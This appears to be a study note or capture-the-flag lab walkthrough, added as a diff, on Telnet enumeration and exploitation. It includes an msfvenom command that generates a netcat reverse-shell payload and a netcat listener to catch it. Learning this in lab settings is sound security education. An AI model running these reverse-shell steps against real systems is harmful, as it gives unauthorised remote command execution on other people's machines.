@@ -1,0 +1,88 @@
+Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
+It is port 23 (TCP). However, in some cases, Telnet may be configured to use a non-standard port.
+The telnet client will establish a connection with the server. The client will then become a virtual terminal - allowing you to interact with the remote host.
+
+Replacement
+Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, 
+Telnet has been replaced by SSH where transmitted data is encrypted.
+ 
+How does Telnet work?
+The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. 
+The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"
+
+Enumeration
+With Telnet enumeration, you can discover various information about the target system, including:
+  Operating System: Identify the OS version based on the service banner.
+  Available Services: Identify the active services on the system.
+  User Account Validation: Brute-forcing or testing existing user accounts.
+  System Configuration: Access network settings, permissions, and potential vulnerabilities.
+
+There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
+  https://www.cvedetails.com/
+  https://cve.mitre.org/
+A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. 
+When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.
+
+Method Breakdown
+So, from our enumeration stage, we know:
+    - There is a poorly hidden telnet service running on this machine
+    - The service itself is marked "SomeName"
+    - We have possible username of "SomeName" implicated
+
+Connecting to Telnet
+You can connect to a telnet server with the following syntax:
+    "telnet [ip] [port]"
+We're going to need to keep this in mind as we try and exploit this machine.
+
+Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!
+
+What is a Reverse Shell?
+A "shell" can simply be described as a piece of code or program which can be used to gain code or command execution on a device.
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.
+
+If we can't type commands by connecting to telnet, then let's check the connection with Tcpdump.
+Tcpdump is a powerful tool for recording and analyzing network traffic. It is used to monitor packets transmitted 
+over the network and provides a deep understanding of how devices communicate.
+Traffic Inspection – You could see incoming and outgoing packets, including the content within the Telnet communication.
+Troubleshooting – If Telnet is not responding properly, you can analyze the packets and check if there is a connection or configuration problem.
+Data Decoding – Since Telnet transmits data unencrypted, it is possible that you wanted to see the transmitted information.
+Security Analysis – In ethical hacking and security testing, it is used to identify potential vulnerabilities.
+
+Using the command, we run tcpdump:
+sudo tcpdump ip proto \\icmp -i ens5 or tun0.
+
+After that, we type the command to see if we are able to type system commands:
+"ping [local THM ip] -c 1"
+
+Sometimes commands had to be prefixed with .RUN, which meant that the Telnet session was not standard and required a special input method.
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+When executed, the target computer opens a reverse shell to your machine on port 4444(for example port not real).
+You can connect using Netcat:
+nc -lvnp 4444
+
+Netcat (or nc) is a powerful network communication tool that allows you to read and write data over network connections using the TCP or UDP protocols. 
+It is often called the "Swiss Army Knife of network tools" because it has a wide range of applications, including:
+  Connecting to remote servers – Allows you to manually send and receive data.
+  Listening for incoming connections – Can be used as a simple server.
+  File transfer – Allows you to send data between devices.
+  Executing commands on a remote system – Can be used for reverse shelling, which is essential in penetration testing.
+
+Why use Netcat in your case?
+When you generated the reverse shell using msfvenom, the goal was to establish a connection between the target system and your machine. 
+Netcat is an ideal tool for this because:
+  Allows you to listen for incoming connections – By running nc -lvnp 4444 on your machine, you are waiting for an incoming connection from the target system.
+  Easy to use – Does not require complex configuration.
+  Works on almost all systems – Available on Linux, Windows, and macOS.
+
+When the target system launches a reverse shell, Netcat receives the connection and allows you remote access, which is essential for further exploitation.
